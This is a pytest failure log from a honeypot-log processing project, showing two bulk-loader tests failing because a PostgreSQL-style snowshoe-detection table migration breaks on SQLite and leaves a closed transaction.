INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____________________ test_bulk_loader_mixed_json_formats ______________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_mixed_json_fo0')

>   ???

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:204: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2aa4210>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:10,443:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:10,443:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:10,444:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:10,444:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:10,451:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:10,451:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:10,453:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:10,453:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:10,454:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:10,454:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:10,456:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:10,456:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:10,458:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:10,458:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:10,459:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:10,459:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:10,460:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:10,460:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:10,461:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:10,461:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:10,463:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:10,463:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:10,464:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:10,464:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:10,464:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:10,464:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:10,465:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:10,465:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:10,466:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,466:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,467:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,467:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,468:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,468:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,468:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,468:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,469:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,469:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:10,469:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:10,469:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____________________ test_bulk_loader_sets_enrichment_flags ____________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_sets_enrichme0')

>   ???

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:273: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2abcc90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:11,173:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:11,173:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:11,174:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:11,174:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:11,182:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:11,182:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:11,183:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:11,183:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:11,185:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:11,185:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:11,187:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:11,187:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:11,188:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:11,188:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:11,190:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:11,190:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:11,191:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:11,191:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:11,192:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:11,192:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:11,193:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:11,193:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:11,194:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:11,194:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:11,195:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:11,195:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:11,196:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:11,196:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:11,197:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,197:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,198:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,198:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,198:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,198:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,199:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,199:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,200:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,200:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,200:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:11,200:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
